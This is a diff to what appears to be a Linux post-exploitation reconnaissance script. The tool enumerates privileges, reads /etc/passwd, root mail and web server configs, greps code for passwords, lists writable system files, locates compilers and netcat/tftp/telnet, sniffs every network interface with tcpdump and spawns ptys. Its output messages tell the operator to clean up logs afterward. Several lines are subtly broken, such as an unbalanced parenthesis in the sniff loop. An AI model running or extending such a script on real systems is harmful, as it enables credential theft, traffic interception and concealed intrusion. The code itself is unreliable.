@@ -66,7 +66,7 @@ if [[ whoami == "root"]]
 then
   iptables -L || echo 'We are not root'
 else
-  sudo iptables -L echo 'We got no sudo'
+  sudo iptables -L || echo 'We got no sudo'
 fi
 
 arp -e
@@ -128,9 +128,9 @@ cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
 sh -c "ls -aRl /etc/ | awk '$1 ~ /^.*r.*"
 
-grep -i user [filename]
-grep -i pass [filename]
-grep -C 5 "password" [filename]
+#grep -i user [filename]
+#grep -i pass [filename]
+#grep -C 5 "password" [filename]
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 
 cat /etc/passwd
 cat /etc/group
@@ -183,7 +183,7 @@ cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
 
-# what can be messed with?
+# what can we mess with?
 
 ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
 ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
@@ -323,6 +323,7 @@ fi
   find $fpath -name perl*
   find $fpath -name python*
   find $fpath -name gcc*
+  find $fpath -name g++*
   find $fpath -name cc
 
 
@@ -335,6 +336,7 @@ which netcat || find $fpath -name netcat*
 which tftp || find $fpath -name tftp*
 which ftp || find $fpath -name ftp
 which ncat || find $fpath -name ncat*
+which telnet || find $fpath -name telnet*
 }
 
 
@@ -369,19 +371,19 @@ fi
 }
 
 trySniff(){
-for i in $(/sbin/ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d');do tcpdump -i > $cwd/sniff.log;done
+for i in $(/sbin/ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d');do (tcpdump -i $i > "$cwd/sniff.$i.log";done
 }
 
 case $1 in 
 
 -s|--scrape)
-echo 'Scraping the system... After this is done, try running with --pty or --sniff...'
+echo 'Scraping the system... After this is done (if it ever finishes), try running with --pty or --sniff ...'
 scrapeIt | tee -a $out &>2 >> /dev/null
 bashrecon | tee -a $out &>2 >> /dev/null
 getEnv  | tee -a $out &>2 >> /dev/null
 getCrons | tee -a $out &>2 >> /dev/null
 getSUID | tee -a $out &>2 >> /dev/null
-echo 'Done!'
+echo 'Done! Make sure you clean up the log!'
 ;;
 -P|--pty|--spawn-pty|--spawnpty|--getpty|--get-pty)
 if [ "`tty`" != "not a tty" ]
@@ -393,7 +395,7 @@ fi
 
 case $2 in
 -f | --force)
-echo 'Okay, spawning anyway because of --force...'
+echo 'Sure, why not? Attempting to spawn anyway because of --force...'
 ;;
 esac
 ;;
